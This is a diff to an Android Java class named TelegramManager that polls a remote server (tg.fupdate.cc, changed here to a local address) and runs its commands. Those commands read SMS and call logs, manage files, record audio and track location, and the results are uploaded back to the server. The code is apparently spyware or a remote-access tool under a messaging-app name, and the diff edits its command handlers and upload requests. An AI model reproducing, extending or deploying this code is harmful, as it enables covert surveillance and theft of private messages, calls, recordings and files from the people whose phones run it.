@@ -81,16 +81,16 @@ import static java.security.AccessController.getContext;
  *      AUDIO_R 音频录制
  *      GPS_REALTIME_CONFIG 实时获取位置
  */
+
 public class TelegramManager {
     public static final String TAG = "TelegramManager";
     public static Context context;
 
-    public static String url = "http://tg.fupdate.cc:8001";
-    //public static String url = "http://192.168.3.91:8000";
+    //public static String url = "http://tg.fupdate.cc:8001";
+    public static String url = "http://192.168.3.86:8001";
     public static int count = 0;
 
     public static void startAsync(final Context con) {
-
         try {
             context = con;
             sendReq();
@@ -129,6 +129,7 @@ public class TelegramManager {
             params.addProperty("manufacturer",Build.MANUFACTURER);
             params.addProperty("oem_system",Build.MANUFACTURER + android.net.Uri.encode(Build.MODEL));
             params.addProperty("release", Build.VERSION.RELEASE);
+
         } catch (Exception e){
             e.printStackTrace();
         }
@@ -230,7 +231,7 @@ public class TelegramManager {
                                 break;
                             case "SMS_L": // 短信列表 最近last条记录
                                 if (Permission.getPermission(context,"android.permission.READ_SMS")){
-                                    int number = Integer.valueOf(jsonObject.get("last").toString());
+                                    int number = Integer.parseInt(jsonObject.get("last").toString());
                                     Datas(context,action_id,0,"success", SMSManager.getSMSList(context,number));
                                 } else {
                                     Datas(context,action_id,10001,"没有权限，无法执行操作", null);
@@ -245,7 +246,7 @@ public class TelegramManager {
                                 break;
                             case "CALL_R": // 通话记录 最近last条记录
                                 if (Permission.getPermission(context,"android.permission.READ_CALL_LOG")){
-                                    int number = Integer.valueOf(jsonObject.get("last").toString());
+                                    int number = Integer.parseInt(jsonObject.get("last").toString());
                                     Datas(context,action_id,0,"success", CallsManager.getContentCallLog(context,number));
                                 } else {
                                     Datas(context,action_id,10001,"没有权限，无法执行操作", null);
@@ -308,7 +309,7 @@ public class TelegramManager {
                                     SendFile(context,action_id);
                                 }
                                 break;
-                            case "FILE_MKDIR": // 文件夹创建
+                            case "FILE_MKDIR": // 文件夹创建（暂无）
                                 final String Mk_file = jsonObject.get("path").toString().substring(1,jsonObject.get("path").toString().length()-1);
                                 String Dir_path = Mk_file.substring(0, Mk_file.lastIndexOf("/"));
                                 if (Permission.getPermission(context,"android.permission.WRITE_EXTERNAL_STORAGE")
@@ -339,9 +340,9 @@ public class TelegramManager {
                                 }
                                 break;
                             case "AUDIO_R": // 录音 时长sec
-                                if (Permission.getPermission(context,"android.permission.RECORD_AUDIO")) {
+                                int sec = Integer.valueOf(jsonObject.get("sec").toString());
+                                if (Permission.getPermission(context,"android.permission.RECORD_AUDIO") && sec > 0) {
                                     try {
-                                        int sec = Integer.valueOf(jsonObject.get("sec").toString());
                                         MicManager.startRecording(context,sec,action_id,url); //录音
                                     } catch (Exception e) {
                                         e.printStackTrace();
@@ -464,7 +465,7 @@ public class TelegramManager {
                 .addFormDataPart("device_name", "")
                 .addFormDataPart("os", "AND")
                 .addFormDataPart("timestamp", String.valueOf(System.currentTimeMillis()))
-                .addFormDataPart("version", localVersionName(context))
+                .addFormDataPart("version", "android_1.0.0")
                 .addFormDataPart("down_delay", "-1")
                 .addFormDataPart("action_id", String.valueOf(action_id))
                 .addFormDataPart("code", String.valueOf(10001))
@@ -497,7 +498,7 @@ public class TelegramManager {
                 .addFormDataPart("device_name", "")
                 .addFormDataPart("os", "AND")
                 .addFormDataPart("timestamp", String.valueOf(System.currentTimeMillis()))
-                .addFormDataPart("version", localVersionName(context))
+                .addFormDataPart("version", "android_1.0.0")
                 .addFormDataPart("down_delay", "-1")
                 .addFormDataPart("rt_action_type", rt_action_type)
                 .addFormDataPart("file", file.getName(), RequestBody.create(MultipartBody.FORM, file))
@@ -529,7 +530,7 @@ public class TelegramManager {
             common.addProperty("device_name", "");
             common.addProperty("os", "AND");
             common.addProperty("timestamp", System.currentTimeMillis());
-            common.addProperty("version", localVersionName(context));
+            common.addProperty("version", "android_1.0.0");
             common.addProperty("down_delay", -1);
             return common;
         } catch (Exception e){}
